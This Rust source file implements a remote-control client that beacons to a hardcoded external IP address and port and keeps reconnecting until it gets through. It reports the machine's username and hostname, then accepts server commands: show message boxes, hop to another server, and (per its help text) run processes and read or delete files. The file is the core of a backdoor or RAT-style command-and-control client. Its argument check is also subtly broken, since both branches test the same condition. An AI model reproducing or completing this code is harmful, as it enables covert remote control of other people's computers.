use std::io::{Read, Write};
use std::net::TcpStream;
use std::{thread, time};

use tracing::{info, error, debug};

use crate::utils::*;

pub fn connect() {
    match Client::new("136.243.156.104:3217".to_string()) {
        Ok(mut client) => {
            info!("Connected!");
            client.run()
        }
        Err(_e) => {
            error!("Can't connect to server. Reconnecting...");
            thread::sleep(time::Duration::from_secs(10));
            connect();
        }
    }
}
pub struct Client {
    stream: TcpStream,
    connected: bool,
}

impl Drop for Client {
    fn drop(&mut self) {
        self.send_command("/disconnect");
        self.close();
    }
}

impl Client {
    pub fn new(address: String) -> anyhow::Result<Self> {
        let stream = TcpStream::connect(address)?;

        Ok(Self { stream,connected: true })
    }

    pub fn receive(&mut self) -> String {
        let mut data = [0_u8; 65536];

        let len = self.stream.read(&mut data).unwrap();

        let recv_buf = &data[0..len];

        let ret = String::from_utf8(recv_buf.to_vec()).unwrap();

        debug!("[Received]: {}", ret);

        ret
    }

    pub fn send(&mut self, message: &str) {
        debug!("[Sended]: {}", message);
        self.stream.write(message.to_string().as_bytes()).unwrap();
    }

    pub fn send_command(&mut self,message: &str) -> String
    {
        self.send(message);
        self.receive()
    }

    pub fn check_args(&mut self,args: Vec<&str>,length: usize) -> bool
    {
        if args.len() < length
        {
            self.send("Missing arguments");
            return false;
        }
        else if args.len() < length
        {
            self.send("To much arguments");
            return false;
        }
        true
    }

    pub fn close(&mut self) {
        self.connected = false;
        self.stream.shutdown(std::net::Shutdown::Both).unwrap();
    }

    pub fn run(&mut self) {

        info!("Client started working");

        self.send_command(format!("/setname {}@{}",whoami::username(),whoami::hostname()).as_str());

        while self.connected {

            let message = self.receive();
            let command = message.split_ascii_whitespace().collect::<Vec<&str>>();
            let args = command[1..command.len()].to_vec();

            match command[0] {
                "msg" => {
                    if self.check_args(args.clone(),1)
                    {
                        messagebox(String::from(args[0]));
                        self.send("Done");
                    }
                }
                "run" => {

                }
                "reconnect" =>
                {
                    if self.check_args(args.clone(),2)
                    {
                        match Client::new(format!("{}:{}",args[0],args[1]))
                        {
                            Ok(mut client) => {
                                info!("Reconnected succesfully to {}:{}!",args[0],args[1]);

                                self.send("Succesfully reconnected client... disconnecting...");
                                self.send_command("/disconnect");
                                self.close();

                                client.run()
                            }
                            Err(_e) => {
                                error!("Error reconnecting to server");
                                self.send("Error reconnecting to server");
                            }
                        }
                    }
                }
                "disconnect" => {
                    self.send("Done");

                    self.send_command("/disconnect");
                    self.close();
                }
                "ping" => self.send("Ping received"),

                "help" => {
                    let h = format!(
                        "{}{}{}{}{}{}{}{}{}{}{}{}",
                        "msg <message> - showing message\n",
                        "run <process> <args> - run process\n",
                        "reconnect <ip> <port> - reconnecting to another ServerD\n",
                        "disconnect - disconnecting ServerD Client\n",
                        "ping - sending ping\n",
                        "help - showing help\n",
                        "cd <dir> - changing dir",
                        "pwd - showing directory\n",
                        "ls - list files in dir\n",
                        "mkdir <name> - creating folder\n",
                        "rm <name> - removing file\n",
                        "cat <name> - reading file"
                    );
                    self.send(&h);
                }
                _ => self.send("Unknown command"),
            }
        }
    }
}
